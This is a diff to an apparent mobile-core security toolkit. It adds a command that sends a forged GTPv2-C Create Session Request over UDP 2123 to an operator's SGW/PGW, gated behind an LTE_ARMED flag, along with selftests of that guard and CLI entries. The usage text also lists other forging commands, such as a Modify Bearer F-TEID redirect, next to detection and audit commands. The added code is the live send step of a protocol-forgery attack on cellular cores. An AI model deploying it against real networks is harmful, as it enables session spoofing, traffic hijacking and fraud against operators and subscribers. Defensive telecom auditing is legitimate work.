@@ -2861,6 +2861,16 @@ lcore_selftest() {
     chk forge-len "$(lcore_gtpc_parse_header "$forged" | awk -F'\t' '$1=="length_agrees"{print $2}')" "yes"
     chk cli-unknown "$(lcore_cli_main --nope >/dev/null 2>&1; echo $?)" "2"
 
+    # The last hop is armed, and the refusal comes before any socket: the tool
+    # has no business running in a selftest, so what is asserted here is the
+    # guard and the shape of what it would have sent.
+    out=$(LTE_ARMED=0 lcore_cmd_gtpc_send 203.0.113.9 2>/dev/null)
+    chk gtpc-send-disarmed     "$(fld "$out" status)" "disarmed"
+    chk gtpc-send-disarmed-rc  "$(LTE_ARMED=0 lcore_cmd_gtpc_send 203.0.113.9 >/dev/null 2>&1; echo $?)" "3"
+    chk gtpc-send-would-send   "$(fld "$out" would_send | grep -c 'GTPv2-C, UDP')" "1"
+    chk gtpc-send-armed-nohost "$(LTE_ARMED=1 lcore_cmd_gtpc_send >/dev/null 2>&1; echo $?)" "2"
+    chk gtpc-send-tool-present "$([[ -f "$IMSISTING_ROOT/tools/udp_assoc.py" ]] && echo yes || echo no)" "yes"
+
     out=$(lcore_cli_status_tsv)
     chk status-tag    "$(fld "$out" tag)" "lcore"
     chk status-dir    "$(fld "$out" dir)" "$LCORE_DIR"
@@ -2971,6 +2981,42 @@ M
 }
 
 # ── CLI dispatch ────────────────────────────────────────────────────────
+# ── the last hop ────────────────────────────────────────────────────────
+# --gtp-csr-forge builds the Create Session Request and stops.  This publishes
+# it, on UDP 2123, and it is armed for the same reason the small cell's SCTP
+# association is: a build must not be one typo away from a live core.  The
+# datagram itself proves nothing beyond the kernel accepting it -- UDP has no
+# acknowledgement -- so the report carries the reply when one comes back and
+# says "unconfirmed" when none does.
+lcore_cmd_gtpc_send() {
+    local host="${1:-}" port="${2:-2123}" hex="${3:-}"
+    local tool="$IMSISTING_ROOT/tools/udp_assoc.py"
+    if [[ "${LTE_ARMED:-0}" != "1" ]]; then
+        printf 'status\tdisarmed\n'
+        printf 'reason\ta datagram is sent only when LTE_ARMED=1; the octets build either way\n'
+        printf 'would_send\t%s to %s:%s as GTPv2-C, UDP\n' \
+            "${hex:-<a forged Create Session Request>}" "${host:-<no host given>}" "$port"
+        return 3
+    fi
+    if [[ -z "$host" ]]; then
+        printf 'ERROR\tneed <sgw-or-pgw-host> [port] [hex]\n' >&2
+        return 2
+    fi
+    if [[ ! -f "$tool" ]]; then
+        printf 'ERROR\t%s is missing; cannot send\n' "$tool" >&2
+        return 1
+    fi
+    if [[ -z "$hex" ]]; then
+        hex=$(lcore_cmd_gtp_csr_forge 310150123456789 internet 310 260 \
+              | awk -F'\t' '$1=="message"{print $2; exit}')
+        [[ -n "$hex" ]] || { printf 'ERROR\tthe GTP-C builder returned no octets\n' >&2; return 1; }
+    fi
+    printf 'leg\tGTPv2-C\n'
+    printf 'target\t%s:%s\n' "$host" "$port"
+    printf 'encapsulation\tudp\n'
+    timeout 30 python3 "$tool" send "$host" "$port" "$hex" --wait "${LTE_WAIT:-0}"
+}
+
 lcore_cli_main() {
     local cmd="${1:-}"
     (($# > 0)) && shift
@@ -2984,6 +3030,7 @@ lcore_cli_main() {
         --build-clr)     lcore_cmd_build_clr "${1:-310150123456789}" ;;
         --gtp-csr-forge) lcore_cmd_gtp_csr_forge "${1:-310150123456789}" "${2:-internet}" "${3:-310}" "${4:-260}" ;;
         --gtp-modify-bearer) lcore_cmd_gtp_modify_bearer "${1:-}" "${2:-5}" ;;
+        --gtpc-send)     lcore_cmd_gtpc_send "${1:-}" "${2:-2123}" "${3:-}" ;;
         --gtpdoor-detect) lcore_cmd_gtpdoor "${1:-}" ;;
         --cdr-fraud-check) lcore_cmd_cdr_fraud "${1:-}" ;;
         --fs20-audit)    lcore_cmd_fs20 "${1:-}" ;;
@@ -3009,6 +3056,9 @@ Usage: $0 COMMAND
                               forge a GTP-C Create Session Request
   --gtp-modify-bearer <TEID> [EBI]
                               forge a GTP-C Modify Bearer (F-TEID redirect)
+  --gtpc-send <host> [port] [hex]
+                              send the Create Session Request over UDP 2123
+                              (needs LTE_ARMED=1; reports disarmed otherwise)
   --gtpdoor-detect <hex>      GTPdoor-class Echo abuse detection
   --cdr-fraud-check <tsv>     CDR overbilling/bypass anomaly
   --fs20-audit <config>       GSMA FS.20 GTP interconnect controls
